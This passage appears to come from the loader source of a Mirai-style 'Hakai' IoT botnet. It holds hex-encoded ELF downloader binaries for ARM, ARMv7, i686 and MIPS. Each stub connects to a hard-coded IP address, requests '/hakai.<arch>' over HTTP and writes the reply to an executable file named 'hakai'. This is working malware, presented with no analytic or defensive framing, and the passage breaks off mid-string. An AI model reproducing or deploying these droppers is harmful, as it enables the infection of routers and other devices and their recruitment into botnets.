    BIT_32, ENDIAN_LITTLE, EM_ARM , "\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x38\x81\x00\x00\x34\x00\x00\x00\xcc\x02\x00\x00\x02\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xac\x02\x00\x00\xac\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xac\x02\x00\x00\xac\x02\x01\x00\xac\x02\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x72\x00\x00\xea\x01\x00\x90\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x6e\x00\x00\xea\x06\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x67\x00\x00\xea\x05\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x03\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x5f\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x56\x00\x00\xea\x04\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x4f\x00\x00\xea\x03\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x01\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x47\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\xf0\x40\x2d\xe9\x50\x30\xa0\xe3\x94\xd0\x4d\xe2\x83\x30\xcd\xe5\xe4\x30\x9f\xe5\x00\x60\xa0\xe3\x02\x40\xa0\xe3\xdc\x10\x9f\xe5\xdc\x20\x9f\xe5\xdc\x00\x9f\xe5\x84\x30\x8d\xe5\x80\x40\xcd\xe5\x81\x60\xcd\xe5\x82\x60\xcd\xe5\xc7\xff\xff\xeb\x01\x10\xa0\xe3\x06\x20\xa0\xe1\x00\x70\xa0\xe1\x04\x00\xa0\xe1\xe1\xff\xff\xeb\x80\x10\x8d\xe2\x00\x50\xa0\xe1\x10\x20\xa0\xe3\xc5\xff\xff\xeb\x05\x00\xa0\xe1\xa0\x10\x9f\xe5\x1b\x20\xa0\xe3\xcb\xff\xff\xeb\x1b\x00\x50\xe3\x03\x00\xa0\x13\xaf\xff\xff\x1b\x06\x40\xa0\xe1\x93\x10\x8d\xe2\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xca\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\xa7\xff\xff\x1b\x93\x30\xdd\xe5\x04\x44\x83\xe1\x64\x30\x9f\xe5\x03\x00\x54\xe1\xf3\xff\xff\x1a\x0d\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xbe\xff\xff\xeb\x00\x20\x50\xe2\x0d\x40\xa0\xe1\x0d\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\xb1\xff\xff\xeb\xf4\xff\xff\xea\x05\x00\xa0\xe1\x99\xff\xff\xeb\x07\x00\xa0\xe1\x97\xff\xff\xeb\x03\x00\xa0\xe3\x91\xff\xff\xeb\x94\xd0\x8d\xe2\xf0\x80\xbd\xe8\xb2\x80\xb9\xfa\x41\x02\x00\x00\xff\x01\x00\x00\x88\x82\x00\x00\x90\x82\x00\x00\x0a\x0d\x0a\x0d\x70\x40\x2d\xe9\x10\x40\x8d\xe2\x70\x00\x94\xe8\x71\x00\x90\xef\x01\x0a\x70\xe3\x00\x40\xa0\xe1\x70\x80\xbd\x98\x03\x00\x00\xeb\x00\x30\x64\xe2\x00\x30\x80\xe5\x00\x00\xe0\xe3\x70\x80\xbd\xe8\x00\x00\x9f\xe5\x0e\xf0\xa0\xe1\xac\x02\x01\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x61\x72\x6d\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\x14\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x88\x82\x00\x00\x88\x02\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xac\x02\x01\x00\xac\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 916,
     // arm7
    BIT_32, ENDIAN_LITTLE, EM_ARM + 1, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x84\x81\x00\x00\x34\x00\x00\x00\x50\x03\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x04\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xf8\x02\x00\x00\xf8\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xf8\x02\x00\x00\xf8\x02\x01\x00\xf8\x02\x01\x00\x10\x00\x00\x00\x10\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x07\x00\x00\x00\xf8\x02\x00\x00\xf8\x02\x01\x00\xf8\x02\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x01\x00\xa0\xe3\x62\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x06\x00\xa0\xe3\x5a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x05\x00\xa0\xe3\x4f\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x04\x00\xa0\xe3\x44\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x03\x00\xa0\xe3\x39\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\xf0\x40\x2d\xe9\xb4\x10\x9f\xe5\x8c\xd0\x4d\xe2\xb0\x20\x9f\xe5\xb0\x00\x9f\xe5\xd8\xff\xff\xeb\xac\x10\x9f\xe5\x00\x50\xa0\xe1\x1c\x20\xa0\xe3\x04\x00\xa0\xe1\xde\xff\xff\xeb\x1c\x00\x50\xe3\x03\x00\xa0\x13\xc0\xff\xff\x1b\x90\x70\x9f\xe5\x00\x40\xa0\xe3\x87\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x04\x00\xa0\xe1\xdf\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\xb6\xff\xff\x1b\x87\x30\xdd\xe5\x04\x44\x83\xe1\x07\x00\x54\xe1\xf4\xff\xff\x1a\x07\x40\x8d\xe2\x04\x10\xa0\xe1\x80\x20\xa0\xe3\x04\x00\xa0\xe1\xd3\xff\xff\xeb\x00\x20\x50\xe2\x04\x10\xa0\xe1\x05\x00\xa0\xe1\x01\x00\x00\xda\xc3\xff\xff\xeb\xf5\xff\xff\xea\x04\x00\xa0\xe1\xad\xff\xff\xeb\x05\x00\xa0\xe1\xab\xff\xff\xeb\x03\x00\xa0\xe3\xa1\xff\xff\xeb\x8c\xd0\x8d\xe2\xf0\x40\xbd\xe8\x1e\xff\x2f\xe1\x41\x02\x00\x00\xff\x01\x00\x00\xd0\x82\x00\x00\xd8\x82\x00\x00\x0a\x0d\x0a\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x0d\xc0\xa0\xe1\xf0\x00\x2d\xe9\x00\x70\xa0\xe1\x01\x00\xa0\xe1\x02\x10\xa0\xe1\x03\x20\xa0\xe1\x78\x00\x9c\xe8\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x0e\xf0\xa0\x31\xff\xff\xff\xea\x04\xe0\x2d\xe5\x1c\x20\x9f\xe5\x00\x30\xa0\xe1\x02\x20\x9f\xe7\x06\x00\x00\xeb\x00\x30\x63\xe2\x02\x30\x80\xe7\x00\x00\xe0\xe3\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x60\x80\x00\x00\x00\x00\x00\x00\x0f\x0a\xe0\xe3\x1f\xf0\x40\xe2\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x61\x72\x6d\x37\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00\x01\x09\x00\x00\x00\x06\x02\x08\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x74\x62\x73\x73\x00\x2e\x67\x6f\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xc0\x80\x00\x00\xc0\x00\x00\x00\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xd0\x82\x00\x00\xd0\x02\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x04\x00\x00\xf8\x02\x01\x00\xf8\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\xf8\x02\x01\x00\xf8\x02\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x24\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x08\x03\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x03\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1128,
    // i686
    BIT_32, ENDIAN_LITTLE, EM_386, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x51\x81\x04\x08\x34\x00\x00\x00\xe0\x02\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xbf\x02\x00\x00\xbf\x02\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00\xc0\x02\x00\x00\xc0\x92\x04\x08\xc0\x92\x04\x08\x00\x00\x00\x00\x04\x00\x00\x00\x06\x00\x00\x00\x00\x10\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x55\x89\xe5\x83\xec\x10\xff\x75\x08\x6a\x01\xe8\xac\x01\x00\x00\x83\xc4\x10\xc9\xc3\x55\x89\xe5\x83\xec\x10\xff\x75\x08\x6a\x06\xe8\x97\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x05\xe8\x7f\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x1c\x8b\x45\x08\x89\x45\xf4\x8b\x45\x0c\x89\x45\xf8\x8b\x45\x10\x89\x45\xfc\x8d\x45\xf4\x50\x6a\x03\x6a\x66\xe8\x58\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x04\xe8\x40\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x03\xe8\x28\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x1c\x8b\x45\x08\x89\x45\xf4\x8b\x45\x0c\x89\x45\xf8\x8b\x45\x10\x89\x45\xfc\x8d\x45\xf4\x50\x6a\x01\x6a\x66\xe8\x01\x01\x00\x00\xc9\xc3\x55\x89\xe5\x57\x56\x53\x81\xec\xb0\x00\x00\x00\x66\xc7\x45\xe0\x02\x00\x66\xc7\x45\xe2\x00\x50\xc7\x45\xe4\xb2\x80\xb9\xfa\x68\xff\x01\x00\x00\x68\x41\x02\x00\x00\x68\x9d\x82\x04\x08\xe8\x37\xff\xff\xff\x83\xc4\x0c\x89\xc7\x6a\x00\x6a\x01\x6a\x02\xe8\x96\xff\xff\xff\x83\xc4\x0c\x89\xc6\x8d\x45\xe0\x6a\x10\x50\x56\xe8\x2e\xff\xff\xff\x83\xc4\x0c\x6a\x1b\x68\xa3\x82\x04\x08\x56\xe8\x45\xff\xff\xff\x83\xc4\x10\x83\xf8\x1b\x74\x0d\x83\xec\x0c\x6a\x03\xe8\xcd\xfe\xff\xff\x83\xc4\x10\x31\xdb\x50\x8d\x45\xf3\x6a\x01\x50\x56\xe8\x39\xff\xff\xff\x83\xc4\x10\x48\x74\x0d\x83\xec\x0c\x6a\x04\xe8\xab\xfe\xff\xff\x83\xc4\x10\x0f\xbe\x45\xf3\xc1\xe3\x08\x09\xc3\x81\xfb\x0a\x0d\x0a\x0d\x75\xcf\x8d\x9d\x60\xff\xff\xff\x51\x68\x80\x00\x00\x00\x53\x56\xe8\x02\xff\xff\xff\x83\xc4\x10\x85\xc0\x7e\x0e\x52\x50\x53\x57\xe8\xda\xfe\xff\xff\x83\xc4\x10\xeb\xd8\x83\xec\x0c\x56\xe8\x7b\xfe\xff\xff\x89\x3c\x24\xe8\x73\xfe\xff\xff\xc7\x04\x24\x03\x00\x00\x00\xe8\x52\xfe\xff\xff\x83\xc4\x10\x8d\x65\xf4\x5b\x5e\x5f\x5d\xc3\x90\x90\x90\x55\x57\x56\x53\x8b\x6c\x24\x2c\x8b\x7c\x24\x28\x8b\x74\x24\x24\x8b\x54\x24\x20\x8b\x4c\x24\x1c\x8b\x5c\x24\x18\x8b\x44\x24\x14\xcd\x80\x5b\x5e\x5f\x5d\x3d\x01\xf0\xff\xff\x0f\x83\x01\x00\x00\x00\xc3\x83\xec\x0c\x89\xc2\xf7\xda\xe8\x09\x00\x00\x00\x89\x10\x83\xc8\xff\x83\xc4\x0c\xc3\xb8\xc0\x92\x04\x08\xc3\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x78\x38\x36\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x94\x80\x04\x08\x94\x00\x00\x00\x09\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x9d\x82\x04\x08\x9d\x02\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xc0\x92\x04\x08\xc0\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 936,
    // mips
    BIT_32, ENDIAN_BIG, EM_MIPS, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x01\xe8\x00\x00\x00\x34\x00\x00\x05\x3c\x00\x00\x10\x07\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x04\xb8\x00\x00\x04\xb8\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x04\xc0\x00\x44\x04\xc0\x00\x44\x04\xc0\x00\x00\x00\x48\x00\x00\x00\x60\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x84\x10\x03\x99\xe0\x21\x8f\x99\x80\x50\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa1\x3c\x1c\x00\x05\x27\x9c\x83\xf4\x03\x99\xe0\x21\x8f\x99\x80\x50\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa6\x3c\x1c\x00\x05\x27\x9c\x83\xd8\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa5\x3c\x1c\x00\x05\x27\x9c\x83\xb0\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x50\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x83\x64\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa4\x3c\x1c\x00\x05\x27\x9c\x83\x3c\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa3\x3c\x1c\x00\x05\x27\x9c\x83\x14\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x50\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x01\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x82\xc8\x03\x99\xe0\x21\x27\xbd\xff\x40\xaf\xbf\x00\xbc\xaf\xb2\x00\xb8\xaf\xb1\x00\xb4\xaf\xb0\x00\xb0\xaf\xbc\x00\x10\x24\x02\x00\x02\xa7\xa2\x00\x1c\x24\x02\x00\x50\x8f\x84\x80\x18\xa7\xa2\x00\x1e\x3c\x02\xb2\x80\x8f\x99\x80\x54\x34\x42\xb9\xfa\x24\x84\x04\x90\x24\x05\x03\x01\x24\x06\x01\xff\x03\x20\xf8\x09\xaf\xa2\x00\x20\x8f\xbc\x00\x10\x24\x05\x00\x02\x8f\x99\x80\x44\x00\x00\x30\x21\x24\x04\x00\x02\x03\x20\xf8\x09\x00\x40\x90\x21\x8f\xbc\x00\x10\x00\x40\x20\x21\x8f\x99\x80\x3c\x27\xa5\x00\x1c\x24\x06\x00\x10\x03\x20\xf8\x09\x00\x40\x88\x21\x8f\xbc\x00\x10\x02\x20\x20\x21\x8f\x85\x80\x18\x8f\x99\x80\x40\x24\xa5\x04\x98\x03\x20\xf8\x09\x24\x06\x00\x1c\x24\x03\x00\x1c\x8f\xbc\x00\x10\x10\x43\x00\x07\x00\x00\x80\x21\x8f\x99\x80\x48\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x00\x00\x80\x21\x8f\x99\x80\x34\x02\x20\x20\x21\x27\xa5\x00\x18\x03\x20\xf8\x09\x24\x06\x00\x01\x8f\xbc\x00\x10\x24\x03\x00\x01\x8f\x99\x80\x48\x10\x43\x00\x04\x24\x04\x00\x04\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x83\xa3\x00\x18\x00\x10\x12\x00\x00\x43\x80\x25\x3c\x02\x0d\x0a\x34\x42\x0d\x0a\x16\x02\xff\xed\x00\x00\x00\x00\x8f\x99\x80\x34\x27\xb0\x00\x2c\x02\x20\x20\x21\x02\x00\x28\x21\x03\x20\xf8\x09\x24\x06\x00\x80\x8f\xbc\x00\x10\x02\x00\x28\x21\x8f\x99\x80\x40\x00\x40\x30\x21\x18\x40\x00\x06\x02\x40\x20\x21\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x10\x00\xff\xf0\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x20\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x40\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x48\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\xbc\x8f\xb2\x00\xb8\x8f\xb1\x00\xb4\x8f\xb0\x00\xb0\x03\xe0\x00\x08\x27\xbd\x00\xc0\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x81\x00\x03\x99\xe0\x21\x00\x80\x10\x21\x00\xa0\x20\x21\x00\xc0\x28\x21\x00\xe0\x30\x21\x8f\xa7\x00\x10\x8f\xa8\x00\x14\x8f\xa9\x00\x18\x8f\xaa\x00\x1c\x27\xbd\xff\xe0\xaf\xa8\x00\x10\xaf\xa9\x00\x14\xaf\xaa\x00\x18\xaf\xa2\x00\x1c\x8f\xa2\x00\x1c\x00\x00\x00\x0c\x14\xe0\x00\x03\x27\xbd\x00\x20\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x40\x20\x21\x8f\x99\x80\x38\x00\x00\x00\x00\x03\x20\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x90\x03\x99\xe0\x21\x27\xbd\xff\xe0\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x30\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f\xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x40\x03\x99\xe0\x21\x8f\x82\x80\x2c\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x69\x70\x73\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x05\x10\x00\x40\x04\x70\x00\x40\x01\x74\x00\x40\x04\x20\x00\x40\x01\x00\x00\x40\x01\x4c\x00\x40\x01\x9c\x00\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x03\xb0\x00\x40\x00\xd8\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\xa0\x00\x00\x00\xa0\x00\x00\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x40\x04\x90\x00\x00\x04\x90\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x10\x00\x00\x03\x00\x44\x04\xc0\x00\x00\x04\xc0\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x44\x05\x10\x00\x00\x05\x08\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x05\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\